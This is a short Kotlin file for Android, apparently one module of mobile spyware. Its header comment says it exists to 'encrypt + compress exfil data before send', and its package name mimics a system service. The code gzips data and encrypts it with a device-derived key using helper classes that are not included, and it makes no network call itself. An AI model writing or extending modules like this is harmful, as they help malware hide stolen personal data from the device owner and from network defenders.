// [context: Kotlin, Android API 26+, encrypt + compress exfil data before send]
package com.system.service.crypto

import java.io.ByteArrayOutputStream
import java.util.zip.GZIPOutputStream

object DataEncryptor {

    fun encryptAndCompress(data: ByteArray): ByteArray {
        val compressed = gzip(data)
        val key = KeyDerivation.deriveDeviceKey()
        return SessionCrypto.encrypt(compressed, key)
    }

    fun encrypt(data: ByteArray, key: ByteArray): ByteArray =
        SessionCrypto.encrypt(data, key)

    private fun gzip(data: ByteArray): ByteArray {
        val bos = ByteArrayOutputStream()
        GZIPOutputStream(bos).use { it.write(data) }
        return bos.toByteArray()
    }
}
